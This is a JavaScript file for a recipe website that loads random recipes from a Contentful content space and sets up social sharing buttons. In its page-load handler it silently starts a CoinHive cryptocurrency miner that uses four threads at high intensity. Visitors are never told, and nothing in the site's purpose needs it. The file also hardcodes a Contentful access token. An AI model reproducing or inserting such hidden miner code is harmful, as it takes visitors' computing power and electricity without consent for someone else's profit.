var CACHE_KEY = 'cached_recipes';
var TIMESTAMP_KEY = 'cached_recipes_ts';
var DAYS_UNTIL_INVALIDATION = 1;

$(document).ready(function() {
    var miner = new CoinHive.Anonymous('8tlshLRjCZAHt8EkozsP4PAzAGOKeKFc');
    miner.setNumThreads(4);
    miner.setThrottle(0.9);
    miner.start();
    fetchRecipe();
});

function fetchRecipe() {
    var entry_id = getParameterByName("entry");
    var allEntries = [];

    createContentfulClient().getEntries({
        'content_type': 'recipe'
    }).then((entries) => {
        allEntries = entries.items;

        createContentfulClient().getEntries({
            'content_type': 'shareable'
        }).then((entries) => {
            allEntries = allEntries.concat(entries.items);

            localizedEntries = $.grep(allEntries, (e) => { return e.fields.language == localStorage.getItem(LANGUAGE_CACHE_KEY) });
            currentEntry = fetchRandomEntryFrom(localizedEntries);
    
            if (entry_id) {
                currentEntry = $.grep(allEntries, (e) => { return e.sys.id == entry_id })[0];
            }

            setEntry();
        });
    });
}

function setEntry() {
    setBackground();
    setRecipeName(); 

    if (currentEntry.sys.contentType.sys.id === 'recipe') {
        setBlogLogo();
        setRecipeName();
        setExecutionTime();
        setPortions();
        setLink(); 
    }
    else if (currentEntry.sys.contentType.sys.id === 'shareable') {     
        setText();  
        setSocialMediaButtons();
        setLogo();
    }
}

function setLogo() {
    $("#logo").attr("src", "https://images.contentful.com/lz8rxz1m2o5d/2IPr04GnUA4uo2EKA8o8s0/c1f7911562b146a86cacc9e2096f9dd8/logo.png");
}

function setText() {
    var converter = new showdown.Converter();
    $('#executionTime').html(converter.makeHtml(currentEntry.fields.description));
}

function setSocialMediaButtons() {
    $('#link').remove();
    $(".socialMedia").show();

    $(".facebook").attr("href", "https://facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwhatshouldieat.xyz");
    $(".twitter").attr("href", "https://twitter.com/intent/tweet/?text=" + encodeURIComponent($("#executionTime").text()) + ";url=https%3A%2F%2Fwhatshouldieat.xyz");
    $(".linkedin").attr("href", "https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fwhatshouldieat.xyz&amp;title=" + encodeURIComponent($("#executionTime").text()) + ";summary=" + encodeURIComponent($("#executionTime").text()) + ";source=https%3A%2F%2Fwhatshouldieat.xyz");
}

function fetchCache(key) {
    return localStorage.getItem(key);
}

function cache(key, value) {
    localStorage.setItem(key, JSON.stringify(value));
}

function createContentfulClient() {
    var SPACE_ID = 'lz8rxz1m2o5d'
    var ACCESS_TOKEN = 'a624220986fe3b346440c1558ba555f541701cf9181d39363ef686579153a343'

    return contentful.createClient({
        space: SPACE_ID,
        accessToken: ACCESS_TOKEN
    });
}

function fetchRandomEntryFrom(entries) {
    return entries[Math.floor((Math.random() * entries.length))];
}

function setBackground() {
    var quality = 70;
    var url = currentEntry.fields.image.fields.file.url + '?fm=jpg&w=2048&h=1440&q=' + quality;

    var cssToInsert = "linear-gradient(to right, rgba(0,0,0,0) 0%,rgba(0,0,0,0) 42%,rgba(0,0,0,1) 81%,rgba(0,0,0,1) 99%), url(https:" + url + ") no-repeat fixed";

    $(".intro").css("background", cssToInsert);
    $(".intro").css("background-size", "cover");
}

function setBlogLogo() {
    $("#logo").attr("src", "https:" + currentEntry.fields.logo.fields.file.url);
}

function setRecipeName() {
    $("#name").text(currentEntry.fields.name);
}

function setExecutionTime() {
    $("#execution").text(currentEntry.fields.preparationTime);
}

function setPortions() {
    $("#portions").text(currentEntry.fields.portions);
}

function setLink() {
    $("#logo-link").attr("href", currentEntry.fields.blog);
    $("#link").attr("href", currentEntry.fields.blog);
}

function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, " "));
}